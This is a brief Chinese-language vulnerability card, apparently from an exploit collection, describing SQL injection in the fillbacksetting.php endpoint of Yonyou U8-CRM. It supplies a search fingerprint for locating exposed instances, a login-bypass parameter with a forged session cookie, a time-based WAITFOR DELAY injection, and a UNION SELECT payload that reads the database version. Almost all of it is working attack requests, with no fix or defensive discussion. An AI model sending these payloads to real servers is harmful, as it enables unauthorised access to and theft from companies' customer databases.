# 用友U8-CRM系统fillbacksetting.php存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="用友U8CRM"`
- **请求**：`GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=bgsesstimeout-;`

**请求体 / payload**
```
GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
Host:
Cookie: PHPSESSID=bgsesstimeout-;
```
- **预期**：200　|　—